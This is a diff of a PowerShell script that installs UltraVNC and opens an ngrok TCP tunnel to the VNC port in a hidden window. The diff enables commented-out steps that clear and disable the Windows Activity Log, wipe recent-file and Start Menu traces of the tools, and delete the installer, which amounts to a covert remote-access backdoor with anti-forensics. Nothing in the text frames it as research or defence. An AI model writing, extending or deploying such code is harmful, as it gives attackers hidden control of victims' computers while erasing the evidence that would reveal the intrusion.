@@ -407,26 +407,24 @@ function Install-NGROK {
     # Unzip the NGROK installer
     Expand-Archive -Path $zipFile -DestinationPath "C:\uvnc_ubvba" -Force -ErrorAction Stop
     # Remove the NGROK installer
-    #Remove-Item -Path $zipFile -Force -ErrorAction Stop
+    Remove-Item -Path $zipFile -Force -ErrorAction Stop
     # Add authtoken to NGROK
     Start-Process -FilePath "C:\uvnc_ubvba\ngrok.exe" -ArgumentList "authtoken $token" -Wait -ErrorAction Stop
     # Start NGROK
-    Write-Host "Starting NGROK in background"
     Start-Process -FilePath "C:\uvnc_ubvba\ngrok.exe" -ArgumentList "tcp 5900" -WindowStyle Hidden -ErrorAction Stop
     # Wait for 5 seconds
-    Write-Host "Waiting for 1 second and clearing the screen"
     Start-Sleep -Seconds 1
     Clear-Host
 }
 
 try {
     # Clear Windows Activity Log
-    #WindowsActivityLogClear
-    #Unregister-ScheduledTask -TaskName "WindowsActivityLogClear" -Confirm:$false
+    WindowsActivityLogClear
+    Unregister-ScheduledTask -TaskName "WindowsActivityLogClear" -Confirm:$false
 
     # Disable Windows Activity Log
-    #WindowsActivityLogDisable
-    #Unregister-ScheduledTask -TaskName "WindowsActivityLogDisable" -Confirm:$false
+    WindowsActivityLogDisable
+    Unregister-ScheduledTask -TaskName "WindowsActivityLogDisable" -Confirm:$false
 
     # Disable Protection
     #DisableProtection
@@ -439,24 +437,24 @@ try {
     Install-NGROK
 
     # Clear all occurencies of ngrok and UltraVNC in Windows Recents
-    #WindowsRecentsClear
-    #Unregister-ScheduledTask -TaskName "WindowsRecentsClear" -Confirm:$false
+    WindowsRecentsClear
+    Unregister-ScheduledTask -TaskName "WindowsRecentsClear" -Confirm:$false
 
     # Clear all occurencies of ngrok and UltraVNC in Windows Start Menu
-    #WindowClearStartMenu
-    #Unregister-ScheduledTask -TaskName "WindowClearStartMenu" -Confirm:$false
+    WindowClearStartMenu
+    Unregister-ScheduledTask -TaskName "WindowClearStartMenu" -Confirm:$false
 
     # Check if UltraVNC is installed
-    #CheckInstall -InstallPath "C:\uvnc_ubvba\UltraVNC\winvnc.exe"
+    CheckInstall -InstallPath "C:\uvnc_ubvba\UltraVNC\winvnc.exe"
 
     # Check if UltraVNC service is running
-    #CheckServices -ServiceName "uvnc_service"
+    CheckServices -ServiceName "uvnc_service"
 
     # Check if NGROK is installed
-    #CheckInstall -InstallPath "C:\uvnc_ubvba\ngrok.exe"
+    CheckInstall -InstallPath "C:\uvnc_ubvba\ngrok.exe"
 
     # Check if NGROK service is running
-    #CheckServices -ServiceName "ngrok.exe"
+    CheckServices -ServiceName "ngrok.exe"
 
     # Create a scheduled task to uninstall UltraVNC, ngrok and remove the installation folder
     CreateUninstallTask
@@ -465,8 +463,8 @@ try {
     # EnableProtection
 
     # Enable Windows Activity Log
-    # WindowsActivityLogEnable
-    # Unregister-ScheduledTask -TaskName "WindowsActivityLogEnable" -Confirm:$false
+    WindowsActivityLogEnable
+    Unregister-ScheduledTask -TaskName "WindowsActivityLogEnable" -Confirm:$false
 
     # Remove any tasks created by TI 
     # RemoveAnyTITasks
